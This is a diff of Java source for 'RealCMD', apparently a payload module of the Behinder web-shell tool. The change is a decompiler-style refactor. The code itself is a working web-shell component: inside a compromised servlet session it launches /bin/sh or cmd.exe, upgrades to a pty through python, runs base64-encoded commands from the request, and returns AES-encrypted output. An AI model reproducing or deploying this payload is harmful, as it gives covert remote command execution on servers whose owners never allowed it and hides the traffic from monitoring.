@@ -1,6 +1,5 @@
 package net.rebeyond.behinder.payload.java;
 
-import org.objectweb.asm.Opcodes;
 import sun.misc.BASE64Decoder;
 
 import javax.crypto.Cipher;
@@ -19,8 +18,8 @@ import java.util.Map;
 
 public class RealCMD implements Runnable {
     public static String bashPath;
-    public static String cmd;
     public static String type;
+    public static String cmd;
     private ServletRequest Request;
     private ServletResponse Response;
     private HttpSession Session;
@@ -33,23 +32,26 @@ public class RealCMD implements Runnable {
         this.Session = page.getSession();
         this.Response = page.getResponse();
         this.Request = page.getRequest();
-        Map<String, String> result = new HashMap<>();
+        HashMap result = new HashMap();
+
         try {
-            result.put("msg", runCmd(page));
+            result.put("msg", this.runCmd(page));
             result.put("status", "success");
-        } catch (Exception e) {
+        } catch (Exception var6) {
             result.put("status", "fail");
-            result.put("msg", e.getMessage());
+            result.put("msg", var6.getMessage());
         }
+
         try {
             ServletOutputStream so = this.Response.getOutputStream();
-            so.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
+            so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
             so.flush();
             so.close();
             page.getOut().clear();
-        } catch (Exception e2) {
-            e2.printStackTrace();
+        } catch (Exception var5) {
+            var5.printStackTrace();
         }
+
         return true;
     }
 
@@ -62,47 +64,57 @@ public class RealCMD implements Runnable {
 
     public String runCmd(PageContext page) throws Exception {
         page.getResponse().setCharacterEncoding("UTF-8");
+        String result = "";
         if (type.equals("create")) {
             this.Session.setAttribute("working", true);
-            new Thread(new RealCMD(this.Session)).start();
-            return "";
-        } else if (type.equals("read")) {
-            return ((StringBuilder) this.Session.getAttribute("output")).toString();
+            (new Thread(new RealCMD(this.Session))).start();
         } else {
-            if (type.equals("write")) {
-                ((StringBuilder) this.Session.getAttribute("output")).setLength(0);
-                String input = new String(new BASE64Decoder().decodeBuffer(cmd));
-                BufferedWriter writer = (BufferedWriter) this.Session.getAttribute("writer");
-                writer.write(input);
-                writer.flush();
-                Thread.sleep(100);
-                return "";
-            } else if (!type.equals("stop")) {
-                return "";
-            } else {
-                ((Process) this.Session.getAttribute("process")).destroy();
-                return "";
+            StringBuilder output;
+            switch (type) {
+                case "read":
+                    output = (StringBuilder) this.Session.getAttribute("output");
+                    result = output.toString();
+                    break;
+                case "write":
+                    output = (StringBuilder) this.Session.getAttribute("output");
+                    output.setLength(0);
+                    String input = new String((new BASE64Decoder()).decodeBuffer(cmd));
+                    BufferedWriter writer = (BufferedWriter) this.Session.getAttribute("writer");
+                    writer.write(input);
+                    writer.flush();
+                    Thread.sleep(100L);
+                    break;
+                case "stop":
+                    Process process = (Process) this.Session.getAttribute("process");
+                    process.destroy();
+                    break;
             }
         }
+
+        return result;
     }
 
     public void run() {
-        ProcessBuilder builder;
         Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
         StringBuilder output = new StringBuilder();
+
         try {
             String os = System.getProperty("os.name").toLowerCase();
-            if (os.indexOf("windows") >= 0) {
+            ProcessBuilder builder;
+            if (os.contains("windows")) {
                 if (bashPath == null) {
                     bashPath = "c:/windows/system32/cmd.exe";
                 }
+
                 builder = new ProcessBuilder(bashPath);
             } else {
                 if (bashPath == null) {
                     bashPath = "/bin/sh";
                 }
+
                 builder = new ProcessBuilder(bashPath);
             }
+
             builder.redirectErrorStream(true);
             Process process = builder.start();
             OutputStream stdin = process.getOutputStream();
@@ -113,58 +125,71 @@ public class RealCMD implements Runnable {
             this.Session.setAttribute("writer", writer);
             this.Session.setAttribute("output", output);
             this.Session.setAttribute("process", process);
-            if (os.indexOf("windows") < 0) {
-                writer.write(String.format("python -c 'import pty; pty.spawn(\"%s\")'", bashPath) + "\n");
+            if (!os.contains("windows")) {
+                String spawn = String.format("python -c 'import pty; pty.spawn(\"%s\")'", bashPath);
+                writer.write(spawn + "\n");
                 writer.flush();
             }
-            byte[] buffer = new byte[Opcodes.ACC_ABSTRACT];
-            while (true) {
-                int length = stdout.read(buffer);
-                if (length > -1) {
-                    output.append(new String(Arrays.copyOfRange(buffer, 0, length)));
-                } else {
-                    return;
-                }
+
+            byte[] buffer = new byte[1024];
+            boolean var11 = false;
+
+            int length;
+            while ((length = stdout.read(buffer)) > -1) {
+                output.append(new String(Arrays.copyOfRange(buffer, 0, length)));
             }
-        } catch (IOException e) {
-            e.printStackTrace();
-            output.append(e.getMessage());
+        } catch (IOException var12) {
+            var12.printStackTrace();
+            output.append(var12.getMessage());
         }
+
     }
 
-    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
+    private String buildJson(Map entity, boolean encode) throws Exception {
         StringBuilder sb = new StringBuilder();
         String version = System.getProperty("java.version");
         sb.append("{");
-        for (String key : entity.keySet()) {
+
+        for (Object o : entity.keySet()) {
+            String key = (String) o;
             sb.append("\"" + key + "\":\"");
-            String value = entity.get(key);
+            String value = ((String) entity.get(key));
             if (encode) {
+                Class Base64;
+                Object Encoder;
                 if (version.compareTo("1.9") >= 0) {
-                    getClass();
-                    Class Base64 = Class.forName("java.util.Base64");
-                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
+                    this.getClass();
+                    Base64 = Class.forName("java.util.Base64");
+                    Encoder = Base64.getMethod("getEncoder", (Class[]) null).invoke(Base64, (Object[]) null);
                     value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                 } else {
-                    getClass();
-                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
-                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
+                    this.getClass();
+                    Base64 = Class.forName("sun.misc.BASE64Encoder");
+                    Encoder = Base64.newInstance();
+                    value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
+                    value = value.replace("\n", "").replace("\r", "");
                 }
             }
+
             sb.append(value);
             sb.append("\",");
         }
+
         if (sb.toString().endsWith(",")) {
             sb.setLength(sb.length() - 1);
         }
+
         sb.append("}");
         return sb.toString();
     }
 
     private byte[] Encrypt(byte[] bs) throws Exception {
-        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getAttribute("u").toString().getBytes(StandardCharsets.UTF_8), "AES");
+        String key = this.Session.getAttribute("u").toString();
+        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
+        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
         Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
         cipher.init(1, skeySpec);
-        return cipher.doFinal(bs);
+        byte[] encrypted = cipher.doFinal(bs);
+        return encrypted;
     }
 }
